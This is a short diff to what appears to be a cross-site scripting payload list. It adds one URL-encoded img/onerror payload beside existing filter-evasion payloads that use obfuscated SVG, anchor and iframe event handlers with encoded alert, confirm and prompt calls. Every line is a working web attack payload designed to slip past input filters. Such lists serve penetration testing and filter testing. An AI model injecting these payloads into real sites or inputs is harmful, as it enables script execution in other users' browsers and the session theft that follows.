@@ -1,6 +1,7 @@
 "><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
 ">-setTimeout`\u0028alert(1)\u0029`-'
 <a"/onclick=(confirm)()>Click Here!
+%3Cimg%2Fsrc%2Fonerror%3Dalert%2F%2F%26NewLine%3B%282%29%3E
 <svg onload=prompt%26%230000000040document.domain)>
 <svg onload=prompt%26%23x000000028;document.domain)>
 xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
